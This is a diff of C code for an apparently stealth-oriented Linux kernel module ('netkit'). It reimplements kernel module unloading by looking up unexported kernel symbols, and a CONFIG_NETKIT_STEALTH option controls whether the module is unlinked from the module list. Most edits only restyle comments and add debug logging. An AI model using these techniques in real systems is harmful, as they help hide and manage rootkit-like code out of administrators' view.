@@ -38,31 +38,28 @@ int kthread_stop_by_name(const char *name)
     return kthread_stop(task);
 }
 
+
 #define MODULE_REF_BASE	1
 
-/*
- * direct copy
- */
+// direct copy
 static int try_release_module_ref(struct module *mod)
 {
 	int ret;
 
-	/* Try to decrement refcnt which we set at loading */
+	// Try to decrement refcnt which we set at loading
 	ret = atomic_sub_return(MODULE_REF_BASE, &mod->refcnt);
 	BUG_ON(ret < 0);
 	if (ret)
-		/* Someone can put this right now, recover with checking */
+		// Someone can put this right now, recover with checking
 		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);
 
 	return ret;
 }
 
-/*
- * direct copy from kernel, but it's optimized away so no symbol :(
- */
+// direct copy from kernel, but it's optimized away so no symbol :(
 static int try_stop_module(struct module *mod, int flags, int *forced)
 {
-	/* If it's not unused, quit unless we're forcing. */
+	// If it's not unused, quit unless we're forcing.
 	if (try_release_module_ref(mod) != 0) {
 		*forced = (flags & O_TRUNC);
 		if (!(*forced))
@@ -71,7 +68,7 @@ static int try_stop_module(struct module *mod, int flags, int *forced)
 		add_taint(TAINT_FORCED_RMMOD, LOCKDEP_NOW_UNRELIABLE);
 	}
 
-	/* Mark it as dying. */
+	// Mark it as dying.
 	mod->state = MODULE_STATE_GOING;
 
 	return 0;
@@ -105,29 +102,27 @@ static void free_module(struct module *mod)
 
     module_mutex = (struct mutex*)sym_lookup("module_mutex");
 
-	/*
-	 * We leave it in list to prevent duplicate loads, but make sure
-	 * that noone uses it while it's being deconstructed.
-	 */
+	// We leave it in list to prevent duplicate loads, but make sure
+	// that noone uses it while it's being deconstructed.
 	mutex_lock(module_mutex);
 	mod->state = MODULE_STATE_UNFORMED;
 	mutex_unlock(module_mutex);
 
-	/* Arch-specific cleanup. */
+	// Arch-specific cleanup.
 	module_arch_cleanup = (void (*)(struct module*))sym_lookup("module_arch_cleanup");
 	module_arch_cleanup(mod);
 
-	/* Module unload stuff */
+	// Module unload stuff
 	module_unload_free = (void (*)(struct module*))sym_lookup("module_unload_free");
 	module_unload_free(mod);
 
-	/* Free any allocated parameters. */
+	// Free any allocated parameters.
 	destroy_params = (void (*)(struct kernel_param*, unsigned))sym_lookup("destroy_params");
 	destroy_params(mod->kp, mod->num_kp);
 
-	/* Now we can delete it from the lists */
+	// Now we can delete it from the lists
 	mutex_lock(module_mutex);
-	/* Unlink carefully: kallsyms could be walking list. */
+	// Unlink carefully: kallsyms could be walking list.
 	
 #if (!CONFIG_NETKIT_STEALTH)
 	list_del_rcu(&mod->list);
@@ -136,16 +131,16 @@ static void free_module(struct module *mod)
 	mod_tree_remove = (void (*)(struct module*))sym_lookup("mod_tree_remove");
 	mod_tree_remove(mod);
 
-	/* Remove this module from bug list, this uses list_del_rcu */
+	// Remove this module from bug list, this uses list_del_rcu
 	module_bug_cleanup = (void (*)(struct module*))sym_lookup("module_bug_cleanup");
 	module_bug_cleanup(mod);
-	/* Wait for RCU-sched synchronizing before releasing mod->list and buglist. */
+	// Wait for RCU-sched synchronizing before releasing mod->list and buglist.
 	synchronize_rcu();
 	//if (try_add_tainted_module(mod))
 	//	pr_err("%s: adding tainted module to the unloaded tainted modules list failed.\n", mod->name);
 	mutex_unlock(module_mutex);
 
-	/* This may be empty, but that's OK */
+	// This may be empty, but that's OK
 	module_arch_freeing_init = (void (*)(struct module*))sym_lookup("module_arch_freeing_init");
 	module_arch_freeing_init(mod);
 	kfree(mod->args);
@@ -171,7 +166,9 @@ int module_stop(void* data)
     int forced;
     int retv = 0;
 
+
     module_mutex = (struct mutex*)sym_lookup("module_mutex");
+	NETKIT_LOG("[*] module_stop entering mutex lock...\n");
 	if (mutex_lock_interruptible(module_mutex) != 0)
 	{
         retv = -EINTR;
@@ -184,6 +181,7 @@ int module_stop(void* data)
 		goto LAB_OUT;
 	}
 
+	NETKIT_LOG("[*] trying to stop module...\n");
     // just relying on struct mod*
     retv = try_stop_module(mod, 0, &forced);
 	if (retv != 0)
